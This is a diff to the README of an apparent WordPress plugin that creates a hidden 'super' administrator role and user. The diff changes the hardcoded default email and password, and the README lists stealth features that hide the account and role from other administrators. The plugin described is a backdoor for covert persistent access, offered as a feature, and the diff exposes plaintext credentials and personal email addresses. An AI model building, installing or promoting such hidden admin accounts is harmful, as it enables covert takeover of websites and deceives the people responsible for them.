@@ -15,8 +15,8 @@ This plugin creates a hidden `super` administrator role and user in WordPress. T
 *   **Creates Super Role:** On activation, it creates a `super` user role with the same capabilities as a standard Administrator.
 *   **Creates Super User:** It creates a default `super` user. The initial credentials are:
     *   **Username:** `super`
-    *   **Email:** `uog780@gmail.com`
-    *   **Password:** `Ads@2512`
+    *   **Email:** `abubaker.techmkv@gmail.com`
+    *   **Password:** `AbuBaker@123*&6`
 *   **Stealthy Operation:**
     *   The `super` role is hidden from role selection dropdowns for all users except the `super` user.
     *   The `super` user is hidden from the main user list (`users.php`) for all other users.
